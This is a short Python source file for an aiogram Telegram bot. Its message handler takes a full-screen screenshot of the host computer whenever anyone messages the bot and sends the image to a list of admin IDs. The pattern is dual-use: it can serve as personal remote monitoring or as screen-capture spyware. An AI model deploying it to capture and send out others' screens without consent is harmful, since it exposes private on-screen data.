from aiogram import types
from aiogram.types import InputFile
from loader import dp
from PIL import Image
from inc.screenshots import screen
from data.config import admin_id

@dp.message_handler()
async def bot_echo(message: types.Message):
    monitor = {"top": 0, "left": 0, "width": 2560, "height": 1440}
    screen(monitor)

    for admin in admin_id:
        photo = InputFile("sct-0x0_2560x1440.png")
        await dp.bot.send_photo(admin, photo= photo)


